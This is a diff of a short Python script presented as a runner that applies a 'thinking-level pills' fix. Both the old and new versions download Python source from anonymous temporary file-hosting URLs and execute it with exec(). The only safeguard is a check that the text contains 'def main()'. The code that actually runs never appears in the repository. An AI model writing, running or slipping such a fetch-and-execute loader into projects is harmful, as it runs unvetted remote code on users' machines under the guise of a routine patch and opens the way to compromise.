@@ -1,22 +1,18 @@
 #!/usr/bin/env python3
-"""The thinking-level pills (owner 2026-11-10): the patch travels apart from this file; this runner fetches its
-parts in order and applies each from the repo root."""
+"""The thinking-level pills, fix (owner 2026-11-10): the patch travels apart from this file; this runner fetches
+it, sanity-checks it, and applies it from the repo root."""
 import urllib.request
 
-URLS = (
-    "https://n.uguu.se/CORfEyrk.py",
-    "https://n.uguu.se/uHWVfvZK.py",
-)
+URL = "https://d.uguu.se/RlBQpAsf.py"
 
 
 def main():
-    for url in URLS:
-        src = urllib.request.urlopen(url, timeout=60).read().decode("utf-8")
-        print("patch fetched: %d bytes from %s" % (len(src), url))
-        if "def main()" not in src:
-            print("patch looks wrong; nothing applied")
-            return
-        exec(compile(src, url, "exec"), {"__name__": "__main__"})
+    src = urllib.request.urlopen(URL, timeout=60).read().decode("utf-8")
+    print("patch fetched: %d bytes" % len(src))
+    if "def main()" not in src:
+        print("patch looks wrong; nothing applied")
+        return
+    exec(compile(src, URL, "exec"), {"__name__": "__main__"})
 
 
 main()
